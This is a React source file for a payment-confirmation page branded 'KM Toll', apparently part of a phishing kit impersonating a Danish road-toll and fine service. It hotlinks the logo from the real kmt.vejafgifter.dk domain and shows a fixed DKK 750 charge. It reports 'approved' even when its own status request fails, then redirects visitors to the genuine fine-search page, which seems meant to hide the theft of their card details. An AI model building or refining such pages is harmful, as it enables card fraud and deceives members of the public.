import React, { useState, useEffect } from "react";
import {
  AppBar,
  Toolbar,
  Container,
  Typography,
  Button,
  Box,
  Paper,
  SvgIcon,
  useMediaQuery,
  useTheme,
  Menu,
  MenuItem,
  ListItemIcon,
  Grid,
  CircularProgress,
} from "@mui/material";
import CheckIcon from "@mui/icons-material/Check";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import { useNavigate, useLocation } from "react-router-dom";

// Custom dropdown arrow icon
const KeyboardArrowDownIcon = (props) => (
  <SvgIcon {...props} viewBox="0 0 24 24">
    <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
  </SvgIcon>
);

// Logo component
const KMTollLogo = () => (
  <img
    src="https://kmt.vejafgifter.dk/e0845ea56d96bcb377f9.svg"
    alt="KM Toll Logo"
    id="kmTollLogo"
    style={{ height: 36, cursor: "pointer" }}
  />
);

// Country to language mapping
const countryToLanguage = {
  dk: 'da',
  se: 'en',
  no: 'en',
  fi: 'en',
  de: 'en',
  fr: 'en',
  es: 'en',
  it: 'en',
  nl: 'en',
  pl: 'en',
  us: 'en',
  gb: 'en',
  au: 'en',
  ca: 'en',
  nz: 'en',
  ie: 'en',
};

// Translations
const translations = {
  en: {
    title: "Payment Successful!",
    subtitle: "Your payment has been processed successfully.",
    description: "You will receive a confirmation email with your receipt shortly.",
    transactionId: "Transaction ID",
    amount: "Amount",
    date: "Date",
    cardNumber: "Card Number",
    backToHome: "Back to Home",
    printReceipt: "Print Receipt",
    downloadReceipt: "Download Receipt",
    thankYou: "Thank you for your payment!",
    redirectingIn: "Redirecting in",
    seconds: "s",
    viewReceipt: "View Receipt",
    transactionDetails: "Transaction Details",
    status: "Status",
    completed: "Completed",
    paymentMethod: "Payment Method",
    creditCard: "Credit Card",
  },
  da: {
    title: "Betaling Gennemført!",
    subtitle: "Din betaling er blevet behandlet succesfuldt.",
    description: "Du vil modtage en bekræftelsesmail med din kvittering inden for kort tid.",
    transactionId: "Transaktions-ID",
    amount: "Beløb",
    date: "Dato",
    cardNumber: "Kortnummer",
    backToHome: "Tilbage til Forside",
    printReceipt: "Udskriv Kvittering",
    downloadReceipt: "Download Kvittering",
    thankYou: "Tak for din betaling!",
    redirectingIn: "Viderestiller om",
    seconds: "s",
    viewReceipt: "Se Kvittering",
    transactionDetails: "Transaktionsdetaljer",
    status: "Status",
    completed: "Gennemført",
    paymentMethod: "Betalingsmetode",
    creditCard: "Kreditkort",
  }
};

export default function SuccessPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const apiUrl = import.meta.env.VITE_API_URL;
  
  // Language state
  const [language, setLanguage] = useState("Dansk");
  const [anchorEl, setAnchorEl] = useState(null);
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [paymentDetails, setPaymentDetails] = useState(null);
  const [countdown, setCountdown] = useState(10);
  const [isRedirecting, setIsRedirecting] = useState(true);
  
  // Get paymentId from navigation state
  const { paymentId } = location.state || {};
  
  const open = Boolean(anchorEl);
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("sm"));

  // Get translation based on language
  const t = (key) => {
    const lang = language === "Dansk" ? "da" : "en";
    return translations[lang]?.[key] || translations.en[key] || key;
  };

  // Detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();
      const countryCode = data.country_code?.toLowerCase();
      const detectedLang = countryToLanguage[countryCode] || 'en';
      
      const displayLang = detectedLang === 'da' ? 'Dansk' : 'English';
      setLanguage(displayLang);
      localStorage.setItem('preferredLanguage', displayLang);
    } catch (error) {
      console.error('Error detecting language:', error);
      const savedLang = localStorage.getItem('preferredLanguage');
      if (savedLang && (savedLang === 'Dansk' || savedLang === 'English')) {
        setLanguage(savedLang);
      } else {
        const browserLang = navigator.language.split('-')[0];
        setLanguage(browserLang === 'da' ? 'Dansk' : 'English');
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Fetch payment details
  useEffect(() => {
    if (paymentId) {
      fetchPaymentDetails(paymentId);
    }
  }, [paymentId]);

  const fetchPaymentDetails = async (id) => {
    try {
      setIsLoading(true);
      const response = await fetch(`${apiUrl}/api/status/card/${id}`);
      const data = await response.json();
      
      console.log("📊 Payment details:", data);
      
      // Format the data for display
      const formattedDetails = {
        transactionId: data.transactionId || id,
        amount: data.amount || "DKK 750.00",
        date: new Date().toLocaleDateString(language === 'Dansk' ? 'da-DK' : 'en-US', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }),
        cardNumber: data.cardNumber || "XXXX XXXX XXXX 1111",
        status: data.status || "approved",
        paymentMethod: t("creditCard"),
      };
      
      setPaymentDetails(formattedDetails);
    } catch (error) {
      console.error("Error fetching payment details:", error);
      // Set fallback details
      setPaymentDetails({
        transactionId: paymentId || "N/A",
        amount: "DKK 750.00",
        date: new Date().toLocaleDateString(language === 'Dansk' ? 'da-DK' : 'en-US', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }),
        cardNumber: "XXXX XXXX XXXX 1111",
        status: "approved",
        paymentMethod: t("creditCard"),
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Countdown and redirect
  useEffect(() => {
    let timer;
    if (isRedirecting && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
    } else if (countdown === 0 && isRedirecting) {
      window.location.href = "https://kmt.vejafgifter.dk/da/fine/searchFine";
    }
    return () => clearTimeout(timer);
  }, [countdown, isRedirecting]);

  // Handle language menu
  const handleLanguageClick = (event) => {
    setAnchorEl(event.currentTarget);
  };

  const handleLanguageClose = (lang) => {
    if (lang) {
      setLanguage(lang);
      localStorage.setItem('preferredLanguage', lang);
    }
    setAnchorEl(null);
  };

  // Handle print receipt
  const handlePrintReceipt = () => {
    window.print();
  };

  // Handle download receipt
  const handleDownloadReceipt = () => {
    // Create a simple text receipt
    const receipt = `
      ========================================
      PAYMENT RECEIPT
      ========================================
      
      Transaction ID: ${paymentDetails?.transactionId || 'N/A'}
      Date: ${paymentDetails?.date || 'N/A'}
      Amount: ${paymentDetails?.amount || 'DKK 750.00'}
      Card Number: ${paymentDetails?.cardNumber || 'N/A'}
      Status: ${paymentDetails?.status || 'Completed'}
      Payment Method: ${paymentDetails?.paymentMethod || 'Credit Card'}
      
      ========================================
      Thank you for your payment!
      ========================================
    `;
    
    const blob = new Blob([receipt], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `receipt_${paymentDetails?.transactionId || 'payment'}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const handleBackToHome = () => {
    navigate("/");
  };

  if (isLoadingLang || isLoading) {
    return (
      <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <CircularProgress />
      </div>
    );
  }

  return (
    <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", overflow: "hidden" }}>
      {/* Header */}
      <AppBar
        position="relative"
        elevation={0}
        sx={{
          backgroundColor: "#ffffff",
          color: "#000",
          borderBottom: "1px solid rgba(0,0,0,0.12)",
          padding: "0 24px",
          ...(isMobile && { padding: "0 12px" }),
        }}
      >
        <Toolbar sx={{ height: 94, padding: 0 }}>
          <KMTollLogo />
          <Box sx={{ flexGrow: 1 }} />

          <Button
            id="language-picker-button"
            onClick={handleLanguageClick}
            variant="outlined"
            disableRipple
            disableElevation
            sx={{
              width: 140,
              height: 40,
              minWidth: 140,
              px: 2,
              border: "1px solid #C9C9C9",
              borderRadius: "999px",
              backgroundColor: "#fff",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              textTransform: "none",
              fontFamily: "Campton",
              color: "#202020",
              boxShadow: "none",
              "&:hover": {
                backgroundColor: "#fff",
                border: "1px solid #C9C9C9",
                boxShadow: "none",
              },
            }}
          >
            <Typography
              sx={{
                fontFamily: "Campton",
                fontWeight: 600,
                fontSize: 14,
                color: "#202020",
              }}
            >
              {language}
            </Typography>

            <KeyboardArrowDownIcon sx={{ fontSize: 20 }} />
          </Button>

          <Menu
            anchorEl={anchorEl}
            open={open}
            onClose={() => handleLanguageClose()}
            anchorOrigin={{
              vertical: "bottom",
              horizontal: "left",
            }}
            transformOrigin={{
              vertical: "top",
              horizontal: "left",
            }}
            slotProps={{
              paper: {
                sx: {
                  mt: 1,
                  width: 140,
                  borderRadius: "6px",
                  overflow: "hidden",
                  boxShadow: "0 4px 14px rgba(0,0,0,.12)",
                },
              },
            }}
          >
            {["Dansk", "English"].map((item) => (
              <MenuItem
                key={item}
                onClick={() => handleLanguageClose(item)}
                selected={language === item}
                sx={{
                  height: 40,
                  px: 1.5,
                  fontFamily: "Campton",
                  fontSize: 14,
                  fontWeight: 600,
                  color: "#202020",
                  display: "flex",
                  justifyContent: "space-between",
                  "&.Mui-selected": {
                    background: "#F3F3F3",
                  },
                  "&.Mui-selected:hover": {
                    background: "#F3F3F3",
                  },
                }}
              >
                {item}
                {language === item && (
                  <ListItemIcon
                    sx={{
                      minWidth: "auto",
                      color: "#0078D4",
                    }}
                  >
                    <CheckIcon fontSize="small" />
                  </ListItemIcon>
                )}
              </MenuItem>
            ))}
          </Menu>
        </Toolbar>
      </AppBar>

      {/* Main Content */}
      <Container
        maxWidth={false}
        sx={{
          backgroundColor: "#f2f2f2",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          minHeight: "calc(100vh - 93px)",
          padding: isMobile ? "16px 12px" : "0",
          paddingTop: {
            xs: '40px',
            sm: '40px',
            md: '90px',
            lg: '90px',
            xl: '90px'
          },
          overflow: "hidden"
        }}
      >
        {/* Success Container */}
        <Paper
          elevation={0}
          sx={{
            backgroundColor: "#ffffff",
            borderRadius: "8px",
            width: 560,
            height: "auto",
            minHeight: 400,
            margin: "0 12px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            boxSizing: "border-box",
            padding: "40px",
            "@media (max-width: 600px)": {
              width: "100%",
              height: "auto",
              margin: 0,
              padding: "24px",
            },
          }}
        >
          <Grid container spacing={3} sx={{ width: "100%" }}>
            {/* Success Icon */}
            <Grid item xs={12} sx={{ textAlign: "center" }}>
              <Box
                sx={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                  mb: 2,
                }}
              >
                <CheckCircleIcon
                  sx={{
                    fontSize: 80,
                    color: "#4caf50",
                    animation: "pulse 1.5s ease-in-out infinite",
                  }}
                />
                <style>
                  {`
                    @keyframes pulse {
                      0% { transform: scale(1); }
                      50% { transform: scale(1.1); }
                      100% { transform: scale(1); }
                    }
                  `}
                </style>
              </Box>
            </Grid>

            {/* Title */}
            <Grid item xs={12} sx={{ textAlign: "center" }}>
              <Typography
                sx={{
                  fontSize: "24px",
                  fontWeight: 700,
                  color: "#2d2d2d",
                  mb: 1,
                }}
              >
                {t("title")}
              </Typography>
            </Grid>

            {/* Subtitle */}
            <Grid item xs={12} sx={{ textAlign: "center" }}>
              <Typography
                sx={{
                  fontSize: 16,
                  color: "#555",
                  mb: 1,
                }}
              >
                {t("subtitle")}
              </Typography>
            </Grid>

            {/* Description */}
            <Grid item xs={12} sx={{ textAlign: "center" }}>
              <Typography
                sx={{
                  fontSize: 14,
                  color: "#777",
                  mb: 2,
                }}
              >
                {t("description")}
              </Typography>
            </Grid>

            {/* Divider */}
            <Grid item xs={12}>
              <Box
                sx={{
                  borderTop: "1px solid #e0e0e0",
                  my: 1,
                }}
              />
            </Grid>

            {/* Transaction Details */}
            <Grid item xs={12}>
              <Typography
                sx={{
                  fontSize: 16,
                  fontWeight: 600,
                  color: "#2d2d2d",
                  mb: 2,
                }}
              >
                {t("transactionDetails")}
              </Typography>

              <Box sx={{ display: "flex", flexDirection: "column", gap: 1.5 }}>
                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("status")}
                  </Typography>
                  <Typography sx={{ fontSize: 14, fontWeight: 600, color: "#4caf50" }}>
                    ✅ {t("completed")}
                  </Typography>
                </Box>

                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("transactionId")}
                  </Typography>
                  <Typography sx={{ fontSize: 14, fontFamily: "monospace" }}>
                    {paymentDetails?.transactionId || "N/A"}
                  </Typography>
                </Box>

                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("amount")}
                  </Typography>
                  <Typography sx={{ fontSize: 14, fontWeight: 600 }}>
                    {paymentDetails?.amount || "DKK 750.00"}
                  </Typography>
                </Box>

                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("date")}
                  </Typography>
                  <Typography sx={{ fontSize: 14 }}>
                    {paymentDetails?.date || "N/A"}
                  </Typography>
                </Box>

                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("cardNumber")}
                  </Typography>
                  <Typography sx={{ fontSize: 14, fontFamily: "monospace" }}>
                    {paymentDetails?.cardNumber || "XXXX XXXX XXXX 1111"}
                  </Typography>
                </Box>

                <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                  <Typography sx={{ fontSize: 14, color: "#555" }}>
                    {t("paymentMethod")}
                  </Typography>
                  <Typography sx={{ fontSize: 14 }}>
                    {paymentDetails?.paymentMethod || t("creditCard")}
                  </Typography>
                </Box>
              </Box>
            </Grid>

            {/* Divider */}
            <Grid item xs={12}>
              <Box
                sx={{
                  borderTop: "1px solid #e0e0e0",
                  my: 1,
                }}
              />
            </Grid>

            {/* Thank You */}
            <Grid item xs={12} sx={{ textAlign: "center" }}>
              <Typography
                sx={{
                  fontSize: 16,
                  fontWeight: 600,
                  color: "#2d2d2d",
                  mb: 2,
                }}
              >
                {t("thankYou")}
              </Typography>
            </Grid>



            {/* Action Buttons */}
            <Grid item xs={12}>
              <Box
                sx={{
                  display: "flex",
                  flexDirection: isMobile ? "column" : "row",
                  gap: 2,
                  justifyContent: "center",
                  mt: 2,
                }}
              >
                <Button
                  variant="contained"
                  onClick={handleBackToHome}
                  sx={{
                    borderRadius: "30px",
                    textTransform: "none",
                    fontFamily: "Campton",
                    fontWeight: 550,
                    fontSize: 14,
                    padding: "10px 24px",
                    backgroundColor: "#0576bf",
                    color: "#fff",
                    border: "2px solid #0576bf",
                    "&:hover": {
                      backgroundColor: "#0466a6",
                      borderColor: "#0466a6",
                    },
                    ...(isMobile && {
                      width: "100%",
                    }),
                  }}
                >
                  {t("backToHome")}
                </Button>

                <Button
                  variant="outlined"
                  onClick={handlePrintReceipt}
                  sx={{
                    borderRadius: "30px",
                    textTransform: "none",
                    fontFamily: "Campton",
                    fontWeight: 550,
                    fontSize: 14,
                    padding: "10px 24px",
                    color: "#0576bf",
                    borderColor: "#0576bf",
                    "&:hover": {
                      backgroundColor: "rgba(5, 118, 191, 0.04)",
                      borderColor: "#0576bf",
                    },
                    ...(isMobile && {
                      width: "100%",
                    }),
                  }}
                >
                  {t("printReceipt")}
                </Button>

                <Button
                  variant="outlined"
                  onClick={handleDownloadReceipt}
                  sx={{
                    borderRadius: "30px",
                    textTransform: "none",
                    fontFamily: "Campton",
                    fontWeight: 550,
                    fontSize: 14,
                    padding: "10px 24px",
                    color: "#0576bf",
                    borderColor: "#0576bf",
                    "&:hover": {
                      backgroundColor: "rgba(5, 118, 191, 0.04)",
                      borderColor: "#0576bf",
                    },
                    ...(isMobile && {
                      width: "100%",
                    }),
                  }}
                >
                  {t("downloadReceipt")}
                </Button>
              </Box>
            </Grid>
          </Grid>
        </Paper>
      </Container>
    </div>
  );
}